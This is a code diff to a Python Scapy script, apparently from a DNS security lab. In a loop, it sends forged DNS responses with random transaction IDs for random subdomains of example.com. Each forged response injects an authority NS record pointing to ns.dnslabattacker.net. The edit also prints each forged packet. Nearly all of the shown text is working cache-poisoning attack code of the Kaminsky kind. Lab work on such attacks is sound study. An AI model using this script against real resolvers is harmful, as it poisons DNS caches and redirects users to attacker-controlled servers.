@@ -68,8 +68,11 @@ def SendDNSQuery(domain):
     sendPacket(sock, dnsPacket, my_ip, my_port)
 
     for i in range(100):
-        dnsPacket = DNS(id=getRandomTXID(), rd=1, qd=DNSQR(qname=domain), ns=DNSRR(rrname=domain, ttl=86400, type="NS", rclass="IN", rdata="ns.dnslabattacker.net"))
+        dnsPacket = DNS(id=getRandomTXID(), rd=1, qd=DNSQR(qname=domain), ns=DNSRR(rrname="example.com", ttl=86400, type="NS", rclass="IN", rdata="ns.dnslabattacker.net"))
+        print dnsPacket.show()
         sendPacket(sock, dnsPacket, my_ip, my_port)
+
+
     response = sock.recv(4096)
     response = DNS(response)
     print "\n***** Packet Received from Remote Server *****"
@@ -79,6 +82,8 @@ def SendDNSQuery(domain):
 
 
 if __name__ == '__main__':
+
+
     while True:
         domain = getRandomSubDomain() + ".example.com"
         response = SendDNSQuery(domain)
